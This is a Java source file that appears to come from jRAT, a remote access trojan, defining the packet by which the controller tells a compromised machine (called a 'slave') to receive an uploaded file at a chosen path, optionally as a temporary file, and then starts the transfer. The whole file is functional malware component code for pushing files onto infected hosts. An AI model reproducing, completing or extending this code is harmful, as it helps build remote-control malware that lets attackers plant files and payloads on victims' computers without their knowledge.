package se.jrat.client.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import se.jrat.client.Slave;
import se.jrat.client.threads.UploadThread;

public class Packet42ServerUploadFile extends AbstractOutgoingPacket {

	private File file;
	private String remoteFile;
	private boolean temp;

	public Packet42ServerUploadFile(File file, String remoteFile) {
		this(file, remoteFile, false);
	}
	
	public Packet42ServerUploadFile(File file, String remoteFile, boolean temp) {
		this.file = file;
		this.remoteFile = remoteFile;
		this.temp = temp;
	}
	
	@Override
	public void write(final Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(temp);
		slave.writeLine(remoteFile);
		dos.writeLong(file.length());

		if (file.exists() && file.isFile()) {
			new UploadThread(slave, remoteFile, file);
		}
	}

	@Override
	public byte getPacketId() {
		return 42;
	}

}
